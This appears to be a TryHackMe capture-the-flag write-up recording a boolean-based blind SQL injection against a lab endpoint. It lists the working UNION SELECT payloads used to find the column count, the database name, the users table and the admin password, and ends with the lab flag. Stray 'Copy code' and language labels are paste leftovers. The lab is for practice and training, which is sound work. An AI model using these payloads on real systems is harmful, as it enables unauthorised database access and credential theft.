# Level Three — Boolean-Based Blind SQLi (Full enumeration)

**Date recorded:** 2025-09-23

**Initial endpoint:**
https://website.thm/checkuser?username=admin

**Enumeration summary (key payloads):**
- Columns check:
admin123' UNION SELECT 1,2,3;--

diff
Copy code
- Database discovery:
admin123' UNION SELECT 1,2,3 where database() like 's%';--

diff
Copy code
*Database discovered:* sqli_three

- Table enumeration:
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' and table_name like 'u%';--

bash
Copy code
*Table discovered:* users

- Column enumeration -> discovered: id, username, password

- Retrieve username/password:
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';

pgsql
Copy code
*Password discovered:* 3845  
**Flag:** THM{SQL_INJECTION_1093}

**Screenshot:** ../screenshot/level3/l3-step1.png
